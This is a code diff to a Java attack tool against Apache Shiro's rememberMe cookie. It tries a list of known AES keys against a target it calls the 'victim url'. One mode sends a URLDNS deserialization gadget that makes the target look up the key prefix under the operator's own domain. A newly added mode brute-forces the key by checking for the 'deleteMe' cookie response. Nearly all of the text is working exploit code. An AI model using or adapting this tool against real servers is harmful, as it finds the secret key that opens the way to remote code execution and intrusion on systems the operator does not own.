@@ -6,15 +6,18 @@ import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
 import java.net.*;
 import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
 
 import org.apache.shiro.codec.Base64;
 import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.subject.SimplePrincipalCollection;
 import org.apache.shiro.util.ByteSource;
 
 public class URLDNS {
     public static void main(String[] args) throws Exception {
         if (args.length == 0) {
-            System.out.println("urldns.jar [your url] [victim url]");
+            System.out.println("urldns.jar urldns [victim url] [your url] \nor\nurldns.jar cookie [victim url]");
             return;
         }
 
@@ -41,19 +44,40 @@ public class URLDNS {
 
         // send rememberMe
         URL victim = new URL(args[1]);
+        if (args[0].equals("urldns")) {
+            for (String key : keys) {
+                byte[] bytes = makeDNSURL(key.substring(0, 3) + "." + args[2]);
+                String rememberMe = shiroEncrypt(key, bytes);
+                HttpURLConnection con = (HttpURLConnection) victim.openConnection();
+                con.setRequestMethod("GET");
+                con.setRequestProperty("Cookie", "rememberMe=" + rememberMe);
+                if (con.getResponseCode() == 200) {
+                    System.out.println("send " + key);
+                } else {
+                    System.out.println("send key failed");
+                }
 
-        for (int i = 0; i < keys.length; i++) {
-            byte[] bytes = makeDNSURL(keys[i].substring(0,3)+"."+args[0]);
-            String rememberMe = shiroEncrypt(keys[i], bytes);
-            HttpURLConnection con = (HttpURLConnection) victim.openConnection();
-            con.setRequestMethod("GET");
-            con.setRequestProperty("Cookie", "rememberMe="+rememberMe);
-            if (con.getResponseCode() == 200) {
-                System.out.println("send "+keys[i]);
-            } else {
-                System.out.println("send key failed");
             }
-
+        } else if (args[0].equals("cookie")) {
+            SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
+            byte[] bytes = getBytes(simplePrincipalCollection);
+            for (String key : keys) {
+                String rememberMe = shiroEncrypt(key, bytes);
+                HttpURLConnection con = (HttpURLConnection) victim.openConnection();
+                con.setRequestMethod("GET");
+                con.setRequestProperty("Cookie", "rememberMe=" + rememberMe);
+                Map<String, List<String>> headers = con.getHeaderFields();
+                List<String> sc = headers.get("Set-Cookie");
+                boolean flag = false;
+                for (String val: sc) {
+                    if (val.contains("rememberMe=deleteMe;")) {
+                        flag = true;
+                    }
+                }
+                if (!flag) {
+                    System.out.println("key is: "+key);
+                }
+            }
         }
 
     }
